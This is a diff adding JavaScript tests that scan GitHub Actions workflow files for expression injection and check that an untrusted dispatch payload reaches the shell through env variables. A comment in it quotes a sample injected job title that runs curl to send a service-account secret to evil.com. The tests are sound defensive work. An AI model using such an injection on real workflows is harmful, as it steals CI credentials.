@@ -614,3 +614,59 @@ test("the production dispatcher is scheduled and publishes publicly", () => {
   assert.match(src, /dry_run:[\s\S]{0,220}default:\s*'false'/);
   assert.match(src, /privacy:[\s\S]{0,220}default:\s*''/);
 });
+
+/* ------------------------------------------------------------------ */
+/* Security: GitHub Actions expression injection                       */
+/* ------------------------------------------------------------------ */
+
+test("no workflow interpolates untrusted input into a shell script", () => {
+  const fs = require("fs");
+  const path = require("path");
+
+  // CodeQL flags this as a high-severity "expression injection" issue:
+  // repository_dispatch client_payload and workflow_dispatch inputs are
+  // attacker-controlled, so a crafted job title such as
+  //   "; curl evil.com -d "$SERVICE_ACCOUNT_JSON" ; #
+  // would execute if it were substituted directly into a `run:` block.
+  // Passing values via `env:` makes the shell treat them as data.
+  const dir = path.join(__dirname, "..", "github_workflows");
+  const files = fs.readdirSync(dir).filter((f) => f.endsWith(".yml"));
+  assert.ok(files.length >= 4, "workflow mirror should not be empty");
+
+  const offenders = [];
+  for (const file of files) {
+    const lines = fs.readFileSync(path.join(dir, file), "utf8").split("\n");
+    let inRun = false;
+    let runIndent = 0;
+
+    lines.forEach((line, i) => {
+      const runMatch = line.match(/^(\s*)run:\s*\|?/);
+      if (runMatch) { inRun = true; runIndent = runMatch[1].length; return; }
+
+      if (inRun) {
+        const indent = line.search(/\S/);
+        if (line.trim() !== "" && indent <= runIndent) { inRun = false; return; }
+        if (/\$\{\{/.test(line)) offenders.push(`${file}:${i + 1} ${line.trim()}`);
+      }
+    });
+  }
+
+  assert.deepEqual(
+    offenders, [],
+    "these lines interpolate an expression inside a run: block — move them to env:\n" +
+    offenders.join("\n")
+  );
+});
+
+test("video_maker passes the untrusted dispatch payload through env", () => {
+  const fs = require("fs");
+  const path = require("path");
+  const src = fs.readFileSync(
+    path.join(__dirname, "..", "github_workflows", "video_maker.yml"), "utf8"
+  );
+
+  // The payload must still reach the renderer, just safely.
+  assert.match(src, /JOB_DATA:\s+\$\{\{ toJson\(github\.event\.client_payload\.jobData\) \}\}/);
+  assert.match(src, /JOB_TITLE:\s+\$\{\{ github\.event\.client_payload\.jobData\.title \}\}/);
+  assert.match(src, /echo "Title\s*:\s*\$JOB_TITLE"/);
+});
